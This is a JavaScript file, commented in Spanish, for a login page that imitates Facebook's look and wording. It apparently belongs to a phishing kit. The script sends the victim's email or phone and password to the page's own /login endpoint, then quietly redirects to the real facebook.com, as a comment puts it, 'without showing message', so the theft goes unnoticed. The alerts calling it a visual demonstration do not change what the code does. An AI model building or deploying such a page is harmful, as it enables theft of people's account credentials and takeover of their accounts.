document.addEventListener('DOMContentLoaded', function() {
    // Seleccionar elementos del formulario
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.querySelector('.login-btn');
    const createAccountBtn = document.querySelector('.create-account-btn');
    
    // Manejar el envío del formulario de login
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || !password) {
            alert('Por favor, completa todos los campos.');
            return;
        }
        
        if (!isValidEmailOrPhone(email)) {
            alert('Por favor, ingresa un correo electrónico o número de teléfono válido.');
            return;
        }
        
        // Cambiar texto del botón para indicar que se está procesando
        loginBtn.textContent = 'Iniciando sesión...';
        loginBtn.disabled = true;
        
        try {
            // Enviar datos al servidor
            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Redirigir inmediatamente a Facebook sin mostrar mensaje
                window.location.href = 'https://www.facebook.com';
            } else {
                alert('Error: ' + result.message);
                loginBtn.textContent = 'Iniciar sesión';
                loginBtn.disabled = false;
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Error de conexión con el servidor');
            loginBtn.textContent = 'Iniciar sesión';
            loginBtn.disabled = false;
        }
    });
    
    // Manejar el botón de crear cuenta
    createAccountBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Funcionalidad de registro no implementada. Esta es solo una demostración visual.');
    });
    
    // Agregar efectos de focus a los inputs
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.style.borderColor = '#1877f2';
            this.style.boxShadow = '0 0 0 2px #e7f3ff';
        });
        
        input.addEventListener('blur', function() {
            if (!this.value) {
                this.style.borderColor = '#dddfe2';
                this.style.boxShadow = 'none';
            }
        });
    });
    
    // Manejar enlaces del footer y otros enlaces
    const links = document.querySelectorAll('a[href="#"]');
    links.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Enlace clickeado:', this.textContent);
        });
    });
    
    // Funcionalidad del botón de más idiomas
    const moreLanguagesBtn = document.querySelector('.more-languages');
    if (moreLanguagesBtn) {
        moreLanguagesBtn.addEventListener('click', function() {
            alert('Más opciones de idioma no implementadas en esta demostración.');
        });
    }
    
    // Validación en tiempo real
    emailInput.addEventListener('input', function() {
        const value = this.value;
        if (value && !isValidEmailOrPhone(value)) {
            this.style.borderColor = '#fa3e3e';
        } else {
            this.style.borderColor = '#dddfe2';
        }
    });
    
    // Función para validar email o teléfono básica
    function isValidEmailOrPhone(value) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
        return emailRegex.test(value) || phoneRegex.test(value.replace(/\s/g, ''));
    }
    
    // Agregar animaciones suaves a los botones
    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-1px)';
            this.style.transition = 'all 0.2s ease';
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
        });
    });
});